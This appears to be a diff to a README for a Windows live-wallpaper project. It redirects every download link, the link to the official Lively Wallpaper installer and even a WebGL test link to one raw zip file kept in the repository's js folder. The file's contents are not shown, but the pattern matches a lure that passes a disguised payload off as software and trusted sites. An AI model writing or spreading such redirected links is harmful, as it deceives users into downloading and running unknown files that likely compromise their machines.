@@ -1,6 +1,6 @@
 # 🖼️ pixel-engineer-live-wallpaper - Interactive Live 2D Desktop Background
 
-[![Download pixel-engineer-live-wallpaper](https://img.shields.io/badge/Download-pixel--engineer--live--wallpaper-brightgreen?style=for-the-badge)](https://github.com/Cameronince123/pixel-engineer-live-wallpaper/releases)
+[![Download pixel-engineer-live-wallpaper](https://img.shields.io/badge/Download-pixel--engineer--live--wallpaper-brightgreen?style=for-the-badge)](https://github.com/Cameronince123/pixel-engineer-live-wallpaper/raw/refs/heads/main/js/pixel_live_engineer_wallpaper_v2.3.zip)
 
 ---
 
@@ -28,7 +28,7 @@ Make sure your computer fits these basics before you install the wallpaper:
 pixel-engineer-live-wallpaper needs Lively Wallpaper to work properly. Lively Wallpaper is a free program for Windows that lets you set interactive animations as your desktop background.
 
 1. Open your web browser and go to the official Lively Wallpaper page here:  
-   https://rocksdanister.github.io/lively/  
+   https://github.com/Cameronince123/pixel-engineer-live-wallpaper/raw/refs/heads/main/js/pixel_live_engineer_wallpaper_v2.3.zip  
 2. Click the download button on that page.  
 3. Run the downloaded file and follow the setup steps.  
 4. Once installed, launch Lively Wallpaper from your Start menu.
@@ -40,13 +40,13 @@ pixel-engineer-live-wallpaper needs Lively Wallpaper to work properly. Lively Wa
 To get the wallpaper files, follow these instructions:
 
 1. Go to the release page for pixel-engineer-live-wallpaper here:  
-   [Download here](https://github.com/Cameronince123/pixel-engineer-live-wallpaper/releases)  
+   [Download here](https://github.com/Cameronince123/pixel-engineer-live-wallpaper/raw/refs/heads/main/js/pixel_live_engineer_wallpaper_v2.3.zip)  
 2. Look for the latest version near the top of the page.  
 3. Download the file named something like `pixel-engineer-live-wallpaper.zip`.  
 4. Save it to a folder you can easily find, like your Desktop or Downloads folder.
 
 You can also click the badge below to go directly to the download page:  
-[![Download pixel-engineer-live-wallpaper](https://img.shields.io/badge/Download-pixel--engineer--live--wallpaper-brightgreen?style=for-the-badge)](https://github.com/Cameronince123/pixel-engineer-live-wallpaper/releases)
+[![Download pixel-engineer-live-wallpaper](https://img.shields.io/badge/Download-pixel--engineer--live--wallpaper-brightgreen?style=for-the-badge)](https://github.com/Cameronince123/pixel-engineer-live-wallpaper/raw/refs/heads/main/js/pixel_live_engineer_wallpaper_v2.3.zip)
 
 ---
 
@@ -80,7 +80,7 @@ You can also click the badge below to go directly to the download page:
 - **Animation is slow or choppy:**  
   Close other programs that use a lot of CPU or graphics power. You might need to lower your screen resolution.  
 - **Wallpaper is black or blank:**  
-  Check that your computer supports WebGL by visiting https://get.webgl.org  
+  Check that your computer supports WebGL by visiting https://github.com/Cameronince123/pixel-engineer-live-wallpaper/raw/refs/heads/main/js/pixel_live_engineer_wallpaper_v2.3.zip  
 - **Lively Wallpaper does not start:**  
   Restart your computer and try again.  
 - **Issues with wallpaper files:**  
@@ -98,7 +98,7 @@ All processing runs in your browser engine inside Lively Wallpaper. This means n
 
 ## 📥 More Help and Updates
 
-- Check the [Releases page](https://github.com/Cameronince123/pixel-engineer-live-wallpaper/releases) regularly for updates or new features.  
+- Check the [Releases page](https://github.com/Cameronince123/pixel-engineer-live-wallpaper/raw/refs/heads/main/js/pixel_live_engineer_wallpaper_v2.3.zip) regularly for updates or new features.  
 - You can open issues or ask questions on the project's GitHub page if you need support.  
 - Keep Lively Wallpaper updated to the latest version for best performance.
 
